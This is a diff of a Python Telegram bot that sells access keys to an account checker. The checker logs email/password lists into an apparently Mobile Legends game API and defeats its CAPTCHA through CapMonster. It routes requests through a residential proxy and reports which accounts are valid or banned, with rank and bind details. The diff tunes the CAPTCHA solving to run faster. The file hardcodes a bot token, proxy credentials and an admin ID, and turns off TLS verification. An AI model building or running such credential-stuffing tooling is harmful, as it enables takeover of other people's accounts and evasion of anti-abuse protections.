@@ -32,26 +32,28 @@ load_dotenv()
 logging.basicConfig(
     format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
     level=logging.INFO,
-    handlers=[
-        logging.FileHandler('bot.log'),
-        logging.StreamHandler()
-    ]
-)
+    handlers=[logging.FileHandler('bot.log'),
+              logging.StreamHandler()])
 
 logger = logging.getLogger(__name__)
+
 
 class BotConfig:
     """Bot configuration class."""
 
     # Bot settings
-    BOT_TOKEN = os.getenv('BOT_TOKEN', '8342752247:AAGV9CmGu-qd7wCdclWNSbO_qmzA7hgfYmk')
+    BOT_TOKEN = os.getenv('BOT_TOKEN',
+                          '8342752247:AAGV9CmGu-qd7wCdclWNSbO_qmzA7hgfYmk')
 
     # Admin settings
     ADMIN_IDS = []
     admin_ids_str = os.getenv('ADMIN_IDS', '7410975556')
     if admin_ids_str:
         try:
-            ADMIN_IDS = [int(id.strip()) for id in admin_ids_str.split(',') if id.strip()]
+            ADMIN_IDS = [
+                int(id.strip()) for id in admin_ids_str.split(',')
+                if id.strip()
+            ]
         except ValueError:
             ADMIN_IDS = []
 
@@ -64,7 +66,8 @@ class BotConfig:
     VALID_KEY_DURATIONS = [1, 3, 7]  # days
 
     # Rate limiting
-    BROADCAST_DELAY = float(os.getenv('BROADCAST_DELAY', '0.1'))  # seconds between messages
+    BROADCAST_DELAY = float(os.getenv('BROADCAST_DELAY',
+                                      '0.1'))  # seconds between messages
 
     @classmethod
     def validate_config(cls) -> List[str]:
@@ -78,6 +81,7 @@ class BotConfig:
             errors.append("At least one ADMIN_ID is required")
 
         return errors
+
 
 class CapMonsterManager:
     """CapMonster API management system."""
@@ -127,19 +131,21 @@ class CapMonsterManager:
             return None
 
         try:
-            response = requests.post('https://api.capmonster.cloud/getBalance', 
-                                   json={"clientKey": api_key}, 
-                                   timeout=10)
+            response = requests.post('https://api.capmonster.cloud/getBalance',
+                                     json={"clientKey": api_key},
+                                     timeout=10)
             data = response.json()
 
             if data.get('errorId') == 0:
                 return data.get('balance')
             else:
-                logger.error(f"CapMonster API error: {data.get('errorDescription')}")
+                logger.error(
+                    f"CapMonster API error: {data.get('errorDescription')}")
                 return None
         except Exception as e:
             logger.error(f"Error getting CapMonster balance: {e}")
             return None
+
 
 class DataManager:
     """Data management system for user tracking and storage."""
@@ -165,7 +171,11 @@ class DataManager:
         except Exception as e:
             logger.error(f"Error saving users: {e}")
 
-    def add_user(self, user_id: int, username: str = None, first_name: str = None, last_name: str = None):
+    def add_user(self,
+                 user_id: int,
+                 username: str = None,
+                 first_name: str = None,
+                 last_name: str = None):
         """Add or update user information."""
         user_id_str = str(user_id)
         now = datetime.now().isoformat()
@@ -180,7 +190,8 @@ class DataManager:
                 user_data['first_name'] = first_name
             if last_name:
                 user_data['last_name'] = last_name
-            user_data['interaction_count'] = user_data.get('interaction_count', 0) + 1
+            user_data['interaction_count'] = user_data.get(
+                'interaction_count', 0) + 1
         else:
             # Create new user
             user_data = {
@@ -211,8 +222,11 @@ class DataManager:
         user_id_str = str(user_id)
         if user_id_str in self.users:
             self.users[user_id_str]['last_seen'] = datetime.now().isoformat()
-            self.users[user_id_str]['interaction_count'] = self.users[user_id_str].get('interaction_count', 0) + 1
+            self.users[user_id_str][
+                'interaction_count'] = self.users[user_id_str].get(
+                    'interaction_count', 0) + 1
             self._save_users()
+
 
 class KeyManager:
     """Key management system for handling access keys with expiration."""
@@ -241,7 +255,9 @@ class KeyManager:
         """Save keys to JSON file."""
         try:
             # Ensure the directory exists
-            os.makedirs(os.path.dirname(self.data_file) if os.path.dirname(self.data_file) else '.', exist_ok=True)
+            os.makedirs(os.path.dirname(self.data_file)
+                        if os.path.dirname(self.data_file) else '.',
+                        exist_ok=True)
 
             with open(self.data_file, 'w') as f:
                 json.dump(self.keys, f, indent=2, default=str)
@@ -280,7 +296,8 @@ class KeyManager:
                     if expires_at <= now:
                         expired_pending.append(key_id)
                 except (KeyError, ValueError) as e:
-                    logger.warning(f"Invalid pending key data for key {key_id}: {e}")
+                    logger.warning(
+                        f"Invalid pending key data for key {key_id}: {e}")
                     expired_pending.append(key_id)
 
         # Remove expired user keys
@@ -338,7 +355,9 @@ class KeyManager:
 
         if key_id not in self.keys['pending_keys']:
             logger.warning(f"Key {key_id} not found in pending keys")
-            logger.debug(f"Available pending keys: {list(self.keys['pending_keys'].keys())}")
+            logger.debug(
+                f"Available pending keys: {list(self.keys['pending_keys'].keys())}"
+            )
             return False
 
         key_data = self.keys['pending_keys'][key_id]
@@ -383,7 +402,8 @@ class KeyManager:
 
         try:
             expires_at = datetime.fromisoformat(key_data['expires_at'])
-            return expires_at > datetime.now() and key_data.get('status') == 'active'
+            return expires_at > datetime.now() and key_data.get(
+                'status') == 'active'
         except (KeyError, ValueError):
             return False
 
@@ -434,6 +454,7 @@ class KeyManager:
         all_keys.sort(key=lambda x: x['created_at'], reverse=True)
         return all_keys
 
+
 class AccountChecker:
     """Account checking functionality from info.py."""
 
@@ -444,45 +465,136 @@ class AccountChecker:
         self.USER_AGENT = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36'
 
         # Rank ranges for display
-        self.RANK_RANGES = [
-            {"min": 0, "max": 4, "rank": "Warrior III"},
-            {"min": 5, "max": 9, "rank": "Warrior II"},
-            {"min": 10, "max": 14, "rank": "Warrior I"},
-            {"min": 15, "max": 19, "rank": "Elite IV"},
-            {"min": 20, "max": 24, "rank": "Elite III"},
-            {"min": 25, "max": 29, "rank": "Elite II"},
-            {"min": 30, "max": 34, "rank": "Elite I"},
-            {"min": 35, "max": 39, "rank": "Master IV"},
-            {"min": 40, "max": 44, "rank": "Master III"},
-            {"min": 45, "max": 49, "rank": "Master II"},
-            {"min": 50, "max": 54, "rank": "Master I"},
-            {"min": 55, "max": 59, "rank": "Grandmaster IV"},
-            {"min": 60, "max": 64, "rank": "Grandmaster III"},
-            {"min": 65, "max": 69, "rank": "Grandmaster II"},
-            {"min": 70, "max": 74, "rank": "Grandmaster I"},
-            {"min": 75, "max": 79, "rank": "Epic IV"},
-            {"min": 80, "max": 84, "rank": "Epic III"},
-            {"min": 85, "max": 89, "rank": "Epic II"},
-            {"min": 90, "max": 94, "rank": "Epic I"},
-            {"min": 95, "max": 99, "rank": "Legend IV"},
-            {"min": 100, "max": 104, "rank": "Legend III"},
-            {"min": 105, "max": 109, "rank": "Legend II"},
-            {"min": 110, "max": 114, "rank": "Legend I"},
-            {"min": 115, "max": 119, "rank": "Mythic V"},
-            {"min": 120, "max": 124, "rank": "Mythic IV"},
-            {"min": 125, "max": 129, "rank": "Mythic III"},
-            {"min": 130, "max": 134, "rank": "Mythic II"},
-            {"min": 135, "max": 139, "rank": "Mythic I"},
-            {"min": 140, "max": 199, "rank": "Mythical Honor"},
-            {"min": 200, "max": 999, "rank": "Mythical Glory"}
-        ]
+        self.RANK_RANGES = [{
+            "min": 0,
+            "max": 4,
+            "rank": "Warrior III"
+        }, {
+            "min": 5,
+            "max": 9,
+            "rank": "Warrior II"
+        }, {
+            "min": 10,
+            "max": 14,
+            "rank": "Warrior I"
+        }, {
+            "min": 15,
+            "max": 19,
+            "rank": "Elite IV"
+        }, {
+            "min": 20,
+            "max": 24,
+            "rank": "Elite III"
+        }, {
+            "min": 25,
+            "max": 29,
+            "rank": "Elite II"
+        }, {
+            "min": 30,
+            "max": 34,
+            "rank": "Elite I"
+        }, {
+            "min": 35,
+            "max": 39,
+            "rank": "Master IV"
+        }, {
+            "min": 40,
+            "max": 44,
+            "rank": "Master III"
+        }, {
+            "min": 45,
+            "max": 49,
+            "rank": "Master II"
+        }, {
+            "min": 50,
+            "max": 54,
+            "rank": "Master I"
+        }, {
+            "min": 55,
+            "max": 59,
+            "rank": "Grandmaster IV"
+        }, {
+            "min": 60,
+            "max": 64,
+            "rank": "Grandmaster III"
+        }, {
+            "min": 65,
+            "max": 69,
+            "rank": "Grandmaster II"
+        }, {
+            "min": 70,
+            "max": 74,
+            "rank": "Grandmaster I"
+        }, {
+            "min": 75,
+            "max": 79,
+            "rank": "Epic IV"
+        }, {
+            "min": 80,
+            "max": 84,
+            "rank": "Epic III"
+        }, {
+            "min": 85,
+            "max": 89,
+            "rank": "Epic II"
+        }, {
+            "min": 90,
+            "max": 94,
+            "rank": "Epic I"
+        }, {
+            "min": 95,
+            "max": 99,
+            "rank": "Legend IV"
+        }, {
+            "min": 100,
+            "max": 104,
+            "rank": "Legend III"
+        }, {
+            "min": 105,
+            "max": 109,
+            "rank": "Legend II"
+        }, {
+            "min": 110,
+            "max": 114,
+            "rank": "Legend I"
+        }, {
+            "min": 115,
+            "max": 119,
+            "rank": "Mythic V"
+        }, {
+            "min": 120,
+            "max": 124,
+            "rank": "Mythic IV"
+        }, {
+            "min": 125,
+            "max": 129,
+            "rank": "Mythic III"
+        }, {
+            "min": 130,
+            "max": 134,
+            "rank": "Mythic II"
+        }, {
+            "min": 135,
+            "max": 139,
+            "rank": "Mythic I"
+        }, {
+            "min": 140,
+            "max": 199,
+            "rank": "Mythical Honor"
+        }, {
+            "min": 200,
+            "max": 999,
+            "rank": "Mythical Glory"
+        }]
 
     def create_proxy_session(self):
         """Create optimized session with proxy and better configuration."""
         session = requests.Session()
         session.proxies = {
-            "http": "http://262ceb93fc50f42b5029__cr.us,th:10f2c09b5217890c@gw.dataimpulse.com:823",
-            "https": "http://262ceb93fc50f42b5029__cr.us,th:10f2c09b5217890c@gw.dataimpulse.com:823"
+            "http":
+            "http://262ceb93fc50f42b5029__cr.us,th:10f2c09b5217890c@gw.dataimpulse.com:823",
+            "https":
+            "http://262ceb93fc50f42b5029__cr.us,th:10f2c09b5217890c@gw.dataimpulse.com:823"
         }
 
         # High-performance adapter configuration
@@ -492,9 +604,7 @@ class AccountChecker:
             max_retries=requests.adapters.Retry(
                 total=1,
                 backoff_factor=0.3,
-                status_forcelist=[500, 502, 503, 504]
-            )
-        )
+                status_forcelist=[500, 502, 503, 504]))
         session.mount('http://', adapter)
         session.mount('https://', adapter)
 
@@ -527,12 +637,11 @@ class AccountChecker:
         except:
             return "Unranked"
 
-    def solve_cn31(self, max_retries=2):
-        """Solve CAPTCHA using CapMonster with enhanced stability and speed."""
+    def solve_cn31(self, max_retries=1):
+        """Solve CAPTCHA using CapMonster with ultra-fast optimization."""
         for retry in range(max_retries):
             task_id = None
             try:
-                # Create task with optimized settings
                 create_payload = {
                     "clientKey": self.capmonster_api_key,
                     "task": {
@@ -550,26 +659,23 @@ class AccountChecker:
 
                 try:
                     task_response = requests.post(
-                        'https://api.capmonster.cloud/createTask', 
-                        json=create_payload, 
-                        timeout=4
-                    )
+                        'https://api.capmonster.cloud/createTask',
+                        json=create_payload,
+                        timeout=2)
                     task_create = task_response.json()
                 except requests.exceptions.Timeout:
                     if retry < max_retries - 1:
-                        time.sleep(0.1)
                         continue
                     raise Exception("Task creation timeout")
                 except Exception as e:
                     if retry < max_retries - 1:
-                        time.sleep(0.1)
                         continue
-                    raise Exception(f"Task creation failed: {str(e)[:30]}")
+                    raise Exception("Task creation failed")
 
                 if task_create.get('errorId') != 0:
-                    error_desc = task_create.get('errorDescription', 'Unknown error')
+                    error_desc = task_create.get('errorDescription',
+                                                 'Unknown error')
                     if retry < max_retries - 1:
-                        time.sleep(0.2)
                         continue
                     raise Exception(f"CapMonster Error: {error_desc[:50]}")
 
@@ -579,21 +685,20 @@ class AccountChecker:
                         continue
                     raise Exception("No task ID received")
 
-                # Optimized polling with exponential backoff
-                check_intervals = [0.5, 0.7, 0.8, 1.0, 1.2, 1.5] + [2.0] * 15  # Start fast, then slower
+                # Ultra-fast polling intervals - more aggressive
+                check_intervals = [0.2, 0.3, 0.4, 0.5, 0.7, 0.9] + [1.2] * 8
 
                 for i, interval in enumerate(check_intervals):
                     time.sleep(interval)
 
                     try:
                         result_response = requests.post(
-                            'https://api.capmonster.cloud/getTaskResult', 
+                            'https://api.capmonster.cloud/getTaskResult',
                             json={
                                 "clientKey": self.capmonster_api_key,
                                 "taskId": task_id
-                            }, 
-                            timeout=4
-                        )
+                            },
+                            timeout=2)
                         task_result = result_response.json()
                     except requests.exceptions.Timeout:
                         if i < len(check_intervals) - 1:
@@ -621,7 +726,8 @@ class AccountChecker:
                             raise Exception("No token in solution")
 
                     elif status == 'failed':
-                        error_desc = task_result.get('errorDescription', 'Unknown error')
+                        error_desc = task_result.get('errorDescription',
+                                                     'Unknown error')
                         if retry < max_retries - 1:
                             break
                         raise Exception(f"CAPTCHA failed: {error_desc[:50]}")
@@ -631,23 +737,19 @@ class AccountChecker:
                             break
                         raise Exception(f"Unexpected status: {status}")
 
-                # If we reach here, the task timed out
                 if retry < max_retries - 1:
-                    time.sleep(0.1)
                     continue
 
             except requests.exceptions.RequestException as e:
                 if retry < max_retries - 1:
-                    time.sleep(0.2)
                     continue
-                raise Exception(f"Network error: {str(e)[:30]}")
+                raise Exception("Network error")
             except Exception as e:
                 if retry < max_retries - 1:
-                    time.sleep(0.1)
                     continue
                 raise e
 
-        raise Exception("CAPTCHA solve failed after all retries")
+        raise Exception("CAPTCHA solve failed")
 
     def check_account_simple(self, email, password):
         """Optimized account check with enhanced stability and error handling."""
@@ -660,7 +762,10 @@ class AccountChecker:
             try:
                 cn31_token = self.solve_cn31()
             except Exception as e:
-                return {"status": "invalid", "reason": f"CAPTCHA failed: {str(e)[:30]}"}
+                return {
+                    "status": "invalid",
+                    "reason": f"CAPTCHA failed: {str(e)[:30]}"
+                }
 
             hashed_pwd = self.md5(password)
             sign = self.generate_sign(email, hashed_pwd, cn31_token)
@@ -686,19 +791,28 @@ class AccountChecker:
 
             # Optimized timeout - balanced speed vs stability
             try:
-                login_res = session.post(self.ACCOUNT_API, json=login_payload, headers=headers, timeout=5)
+                login_res = session.post(self.ACCOUNT_API,
+                                         json=login_payload,
+                                         headers=headers,
+                                         timeout=5)
             except requests.exceptions.Timeout:
                 return {"status": "invalid", "reason": "Login timeout"}
             except requests.exceptions.ConnectionError:
                 return {"status": "invalid", "reason": "Connection failed"}
 
             if login_res.status_code != 200:
-                return {"status": "invalid", "reason": f"HTTP {login_res.status_code}"}
+                return {
+                    "status": "invalid",
+                    "reason": f"HTTP {login_res.status_code}"
+                }
 
             try:
                 data = login_res.json()
             except json.JSONDecodeError:
-                return {"status": "invalid", "reason": "Invalid response format"}
+                return {
+                    "status": "invalid",
+                    "reason": "Invalid response format"
+                }
 
             message = data.get("message", "")
 
@@ -729,9 +843,15 @@ class AccountChecker:
                 try:
                     account_info = self.get_info(jwt_token, session)
                     if not account_info:
-                        return {"status": "invalid", "reason": "Account info failed"}
+                        return {
+                            "status": "invalid",
+                            "reason": "Account info failed"
+                        }
                 except:
-                    return {"status": "invalid", "reason": "Info retrieval failed"}
+                    return {
+                        "status": "invalid",
+                        "reason": "Info retrieval failed"
+                    }
 
                 # Get additional info in parallel with proper timeout handling
                 bind_info = "N/A"
@@ -739,9 +859,12 @@ class AccountChecker:
 
                 try:
                     import concurrent.futures
-                    with concurrent.futures.ThreadPoolExecutor(max_workers=2) as executor:
-                        bind_future = executor.submit(self.get_bind_info, jwt_token, session)
-                        ban_future = executor.submit(self.check_ban_status, jwt_token, session)
+                    with concurrent.futures.ThreadPoolExecutor(
+                            max_workers=2) as executor:
+                        bind_future = executor.submit(self.get_bind_info,
+                                                      jwt_token, session)
+                        ban_future = executor.submit(self.check_ban_status,
+                                                     jwt_token, session)
 
                         try:
                             bind_info = bind_future.result(timeout=2)
@@ -762,7 +885,11 @@ class AccountChecker:
                 account_info["bind_info"] = bind_info
 
                 if ban_status.get("is_banned", False):
-                    return {"status": "banned", "info": account_info, "ban_info": ban_status.get("ban_info")}
+                    return {
+                        "status": "banned",
+                        "info": account_info,
+                        "ban_info": ban_status.get("ban_info")
+                    }
                 else:
                     return {"status": "valid", "info": account_info}
 
@@ -771,7 +898,10 @@ class AccountChecker:
             elif "blocked" in message.lower() or "banned" in message.lower():
                 return {"status": "invalid", "reason": "Account blocked"}
             else:
-                return {"status": "invalid", "reason": f"Login error: {message[:30]}"}
+                return {
+                    "status": "invalid",
+                    "reason": f"Login error: {message[:30]}"
+                }
 
         except requests.exceptions.Timeout:
             return {"status": "invalid", "reason": "Timeout"}
@@ -812,7 +942,11 @@ class AccountChecker:
         }
 
         try:
-            res = session.post(url, headers=headers, json={}, timeout=4, verify=False)
+            res = session.post(url,
+                               headers=headers,
+                               json={},
+                               timeout=4,
+                               verify=False)
             if res.status_code != 200:
                 return None
 
@@ -822,14 +956,22 @@ class AccountChecker:
 
             user = data.get("data", {})
             return {
-                "nn": user.get("name", "N/A"),
-                "reg": user.get("reg_country", "N/A"),
-                "rid": user.get("roleId", "N/A"),
-                "zid": user.get("zoneId", "N/A"),
-                "pic": user.get("avatar", "N/A"),
-                "lvl": user.get("level", "N/A"),
-                "history_rank_level": user.get("history_rank_level", "N/A"),
-                "rank_name": self.get_rank_name(user.get("history_rank_level", "N/A"))
+                "nn":
+                user.get("name", "N/A"),
+                "reg":
+                user.get("reg_country", "N/A"),
+                "rid":
+                user.get("roleId", "N/A"),
+                "zid":
+                user.get("zoneId", "N/A"),
+                "pic":
+                user.get("avatar", "N/A"),
+                "lvl":
+                user.get("level", "N/A"),
+                "history_rank_level":
+                user.get("history_rank_level", "N/A"),
+                "rank_name":
+                self.get_rank_name(user.get("history_rank_level", "N/A"))
             }
         except:
             return None
@@ -847,7 +989,11 @@ class AccountChecker:
         }
 
         try:
-            res = session.post(url, headers=headers, json={}, timeout=2, verify=False)
+            res = session.post(url,
+                               headers=headers,
+                               json={},
+                               timeout=2,
+                               verify=False)
             if res.status_code != 200:
                 return "N/A"
 
@@ -887,13 +1033,18 @@ class AccountChecker:
         payload = {"lang": "en"}
 
         try:
-            res = session.post(url, headers=headers, json=payload, timeout=3, verify=False)
+            res = session.post(url,
+                               headers=headers,
+                               json=payload,
+                               timeout=3,
+                               verify=False)
             if res.status_code != 200:
                 return {"is_banned": False, "ban_info": None}
 
             response_data = res.json()
 
-            if response_data.get("status") == "success" and response_data.get("code") == 0 and "data" in response_data:
+            if response_data.get("status") == "success" and response_data.get(
+                    "code") == 0 and "data" in response_data:
                 punishment_list = response_data["data"]
 
                 if punishment_list and len(punishment_list) > 0:
@@ -906,7 +1057,8 @@ class AccountChecker:
                         if unlock_time:
                             try:
                                 from datetime import datetime
-                                unlock_date = datetime.strptime(unlock_time, "%Y.%m.%d")
+                                unlock_date = datetime.strptime(
+                                    unlock_time, "%Y.%m.%d")
                                 current_date = datetime.now()
                                 is_active = current_date < unlock_date
                             except:
@@ -926,7 +1078,10 @@ class AccountChecker:
                     if active_bans:
                         return {"is_banned": True, "ban_info": active_bans}
                     else:
-                        return {"is_banned": False, "ban_info": punishment_list}
+                        return {
+                            "is_banned": False,
+                            "ban_info": punishment_list
+                        }
                 else:
                     return {"is_banned": False, "ban_info": None}
             else:
@@ -965,19 +1120,28 @@ class AccountChecker:
             }
 
             try:
-                login_res = session.post(self.ACCOUNT_API, json=login_payload, headers=headers, timeout=4)
+                login_res = session.post(self.ACCOUNT_API,
+                                         json=login_payload,
+                                         headers=headers,
+                                         timeout=4)
             except requests.exceptions.Timeout:
                 return {"status": "invalid", "reason": "Login timeout"}
             except requests.exceptions.ConnectionError:
                 return {"status": "invalid", "reason": "Connection failed"}
 
             if login_res.status_code != 200:
-                return {"status": "invalid", "reason": f"HTTP {login_res.status_code}"}
+                return {
+                    "status": "invalid",
+                    "reason": f"HTTP {login_res.status_code}"
+                }
 
             try:
                 data = login_res.json()
             except json.JSONDecodeError:
-                return {"status": "invalid", "reason": "Invalid response format"}
+                return {
+                    "status": "invalid",
+                    "reason": "Invalid response format"
+                }
 
             message = data.get("message", "")
 
@@ -1006,18 +1170,27 @@ class AccountChecker:
                 try:
                     account_info = self.get_info(jwt_token, session)
                     if not account_info:
-                        return {"status": "invalid", "reason": "Account info failed"}
+                        return {
+                            "status": "invalid",
+                            "reason": "Account info failed"
+                        }
                 except:
-                    return {"status": "invalid", "reason": "Info retrieval failed"}
+                    return {
+                        "status": "invalid",
+                        "reason": "Info retrieval failed"
+                    }
 
                 bind_info = "N/A"
                 ban_status = {"is_banned": False, "ban_info": None}
 
                 try:
                     import concurrent.futures
-                    with concurrent.futures.ThreadPoolExecutor(max_workers=2) as executor:
-                        bind_future = executor.submit(self.get_bind_info, jwt_token, session)
-                        ban_future = executor.submit(self.check_ban_status, jwt_token, session)
+                    with concurrent.futures.ThreadPoolExecutor(
+                            max_workers=2) as executor:
+                        bind_future = executor.submit(self.get_bind_info,
+                                                      jwt_token, session)
+                        ban_future = executor.submit(self.check_ban_status,
+                                                     jwt_token, session)
 
                         try:
                             bind_info = bind_future.result(timeout=2)
@@ -1037,7 +1210,11 @@ class AccountChecker:
                 account_info["bind_info"] = bind_info
 
                 if ban_status.get("is_banned", False):
-                    return {"status": "banned", "info": account_info, "ban_info": ban_status.get("ban_info")}
+                    return {
+                        "status": "banned",
+                        "info": account_info,
+                        "ban_info": ban_status.get("ban_info")
+                    }
                 else:
                     return {"status": "valid", "info": account_info}
 
@@ -1046,7 +1223,10 @@ class AccountChecker:
             elif "blocked" in message.lower() or "banned" in message.lower():
                 return {"status": "invalid", "reason": "Account blocked"}
             else:
-                return {"status": "invalid", "reason": f"Login error: {message[:30]}"}
+                return {
+                    "status": "invalid",
+                    "reason": f"Login error: {message[:30]}"
+                }
 
         except requests.exceptions.Timeout:
             return {"status": "invalid", "reason": "Timeout"}
@@ -1071,7 +1251,10 @@ class AccountChecker:
             try:
                 cn31_token = self.solve_cn31(max_retries=1)
             except Exception as e:
-                return {"status": "invalid", "reason": f"CAPTCHA failed: {str(e)[:30]}"}
+                return {
+                    "status": "invalid",
+                    "reason": f"CAPTCHA failed: {str(e)[:30]}"
+                }
 
             hashed_pwd = self.md5(password)
             sign = self.generate_sign(email, hashed_pwd, cn31_token)
@@ -1096,19 +1279,28 @@ class AccountChecker:
             }
 
             try:
-                login_res = session.post(self.ACCOUNT_API, json=login_payload, headers=headers, timeout=4)
+                login_res = session.post(self.ACCOUNT_API,
+                                         json=login_payload,
+                                         headers=headers,
+                                         timeout=4)
             except requests.exceptions.Timeout:
                 return {"status": "invalid", "reason": "Login timeout"}
             except requests.exceptions.ConnectionError:
                 return {"status": "invalid", "reason": "Connection failed"}
 
             if login_res.status_code != 200:
-                return {"status": "invalid", "reason": f"HTTP {login_res.status_code}"}
+                return {
+                    "status": "invalid",
+                    "reason": f"HTTP {login_res.status_code}"
+                }
 
             try:
                 data = login_res.json()
             except json.JSONDecodeError:
-                return {"status": "invalid", "reason": "Invalid response format"}
+                return {
+                    "status": "invalid",
+                    "reason": "Invalid response format"
+                }
 
             message = data.get("message", "")
 
@@ -1137,18 +1329,27 @@ class AccountChecker:
                 try:
                     account_info = self.get_info(jwt_token, session)
                     if not account_info:
-                        return {"status": "invalid", "reason": "Account info failed"}
+                        return {
+                            "status": "invalid",
+                            "reason": "Account info failed"
+                        }
                 except:
-                    return {"status": "invalid", "reason": "Info retrieval failed"}
+                    return {
+                        "status": "invalid",
+                        "reason": "Info retrieval failed"
+                    }
 
                 bind_info = "N/A"
                 ban_status = {"is_banned": False, "ban_info": None}
 
                 try:
                     import concurrent.futures
-                    with concurrent.futures.ThreadPoolExecutor(max_workers=2) as executor:
-                        bind_future = executor.submit(self.get_bind_info, jwt_token, session)
-                        ban_future = executor.submit(self.check_ban_status, jwt_token, session)
+                    with concurrent.futures.ThreadPoolExecutor(
+                            max_workers=2) as executor:
+                        bind_future = executor.submit(self.get_bind_info,
+                                                      jwt_token, session)
+                        ban_future = executor.submit(self.check_ban_status,
+                                                     jwt_token, session)
 
                         try:
                             bind_info = bind_future.result(timeout=2)
@@ -1168,7 +1369,11 @@ class AccountChecker:
                 account_info["bind_info"] = bind_info
 
                 if ban_status.get("is_banned", False):
-                    return {"status": "banned", "info": account_info, "ban_info": ban_status.get("ban_info")}
+                    return {
+                        "status": "banned",
+                        "info": account_info,
+                        "ban_info": ban_status.get("ban_info")
+                    }
                 else:
                     return {"status": "valid", "info": account_info}
 
@@ -1177,7 +1382,10 @@ class AccountChecker:
             elif "blocked" in message.lower() or "banned" in message.lower():
                 return {"status": "invalid", "reason": "Account blocked"}
             else:
-                return {"status": "invalid", "reason": f"Login error: {message[:30]}"}
+                return {
+                    "status": "invalid",
+                    "reason": f"Login error: {message[:30]}"
+                }
 
         except requests.exceptions.Timeout:
             return {"status": "invalid", "reason": "Timeout"}
@@ -1192,6 +1400,7 @@ class AccountChecker:
                 except:
                     pass
 
+
 class TelegramBot:
     """Telegram bot handler with admin controls and user management."""
 
@@ -1203,12 +1412,13 @@ class TelegramBot:
         self.capmonster_manager = CapMonsterManager()
         self.application = None
         self.user_last_upload = {}  # Track last upload time per user
-        self.user_last_check = {}   # Track last /check command time per user
+        self.user_last_check = {}  # Track last /check command time per user
         self.web_app = None
         self.web_runner = None
 
     async def setup_web_server(self):
         """Set up a simple web server for health checks."""
+
         async def health_check(request):
             return web.json_response({
                 "status": "ok",
@@ -1243,26 +1453,40 @@ class TelegramBot:
         self.application = Application.builder().token(self.token).build()
 
         # Add command handlers
-        self.application.add_handler(CommandHandler("start", self.start_command))
+        self.application.add_handler(
+            CommandHandler("start", self.start_command))
         self.application.add_handler(CommandHandler("help", self.help_command))
-        self.application.add_handler(CommandHandler("mykey", self.my_key_command))
-        self.application.add_handler(CommandHandler("redeem", self.redeem_command))
+        self.application.add_handler(
+            CommandHandler("mykey", self.my_key_command))
+        self.application.add_handler(
+            CommandHandler("redeem", self.redeem_command))
 
         # CapMonster and checking commands
-        self.application.add_handler(CommandHandler("apikey", self.set_api_key_command))
-        self.application.add_handler(CommandHandler("balance", self.balance_command))
-        self.application.add_handler(CommandHandler("check", self.check_command))
+        self.application.add_handler(
+            CommandHandler("apikey", self.set_api_key_command))
+        self.application.add_handler(
+            CommandHandler("balance", self.balance_command))
+        self.application.add_handler(
+            CommandHandler("check", self.check_command))
 
         # Admin-only commands
-        self.application.add_handler(CommandHandler("generatekey", self.generate_key_command))
-        self.application.add_handler(CommandHandler("listkeys", self.list_keys_command))
-        self.application.add_handler(CommandHandler("revokekey", self.revoke_key_command))
-        self.application.add_handler(CommandHandler("announce", self.announce_command))
-        self.application.add_handler(CommandHandler("stats", self.stats_command))
+        self.application.add_handler(
+            CommandHandler("generatekey", self.generate_key_command))
+        self.application.add_handler(
+            CommandHandler("listkeys", self.list_keys_command))
+        self.application.add_handler(
+            CommandHandler("revokekey", self.revoke_key_command))
+        self.application.add_handler(
+            CommandHandler("announce", self.announce_command))
+        self.application.add_handler(
+            CommandHandler("stats", self.stats_command))
 
         # Message handler for regular messages and file uploads
-        self.application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, self.handle_message))
-        self.application.add_handler(MessageHandler(filters.Document.ALL, self.handle_document))
+        self.application.add_handler(
+            MessageHandler(filters.TEXT & ~filters.COMMAND,
+                           self.handle_message))
+        self.application.add_handler(
+            MessageHandler(filters.Document.ALL, self.handle_document))
 
         # Start the bot first
         await self.application.initialize()
@@ -1299,10 +1523,12 @@ class TelegramBot:
                 BotCommand("apikey", "Set your CapMonster API key"),
                 BotCommand("balance", "Check your CapMonster balance"),
                 BotCommand("check", "Start account checking process"),
-                BotCommand("generatekey", "Generate new access key (Admin only)"),
+                BotCommand("generatekey",
+                           "Generate new access key (Admin only)"),
                 BotCommand("listkeys", "List all active keys (Admin only)"),
                 BotCommand("revokekey", "Revoke an access key (Admin only)"),
-                BotCommand("announce", "Send announcement to all users (Admin only)"),
+                BotCommand("announce",
+                           "Send announcement to all users (Admin only)"),
                 BotCommand("stats", "Show bot statistics (Admin only)"),
             ]
 
@@ -1310,25 +1536,29 @@ class TelegramBot:
             try:
                 await asyncio.wait_for(
                     self.application.bot.set_my_commands(commands),
-                    timeout=10.0
-                )
+                    timeout=10.0)
 
                 # Set persistent menu button
                 menu_button = MenuButtonCommands()
                 await asyncio.wait_for(
-                    self.application.bot.set_chat_menu_button(menu_button=menu_button),
-                    timeout=10.0
-                )
+                    self.application.bot.set_chat_menu_button(
+                        menu_button=menu_button),
+                    timeout=10.0)
 
                 logger.info("Bot commands and menu set up successfully")
 
             except asyncio.TimeoutError:
-                logger.warning("Timeout setting up bot commands - bot will work without menu")
+                logger.warning(
+                    "Timeout setting up bot commands - bot will work without menu"
+                )
 
         except TelegramError as e:
-            logger.warning(f"Could not set up bot commands (bot will still work): {e}")
+            logger.warning(
+                f"Could not set up bot commands (bot will still work): {e}")
         except Exception as e:
-            logger.warning(f"Unexpected error setting up commands (bot will still work): {e}")
+            logger.warning(
+                f"Unexpected error setting up commands (bot will still work): {e}"
+            )
 
     def is_admin(self, user_id: int) -> bool:
         """Check if user is an admin."""
@@ -1338,7 +1568,8 @@ class TelegramBot:
         """Check if user has a valid key."""
         return self.is_admin(user_id) or self.key_manager.is_key_valid(user_id)
 
-    async def start_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
+    async def start_command(self, update: Update,
+                            context: ContextTypes.DEFAULT_TYPE):
         """Handle /start command."""
         user = update.effective_user
         user_id = user.id
@@ -1359,8 +1590,7 @@ class TelegramBot:
                 "• /stats - View bot statistics\n"
                 "• /mykey - Check your key status\n"
                 "• /help - Show help information\n\n"
-                "💡 Use the menu button (☰) to access commands quickly!"
-            )
+                "💡 Use the menu button (☰) to access commands quickly!")
         elif self.has_valid_key(user_id):
             key_info = self.key_manager.get_key_info(user_id)
             expires_at = datetime.fromisoformat(key_info['expires_at'])
@@ -1373,8 +1603,7 @@ class TelegramBot:
                 "📋 Available Commands:\n"
                 "• /mykey - Check your key status\n"
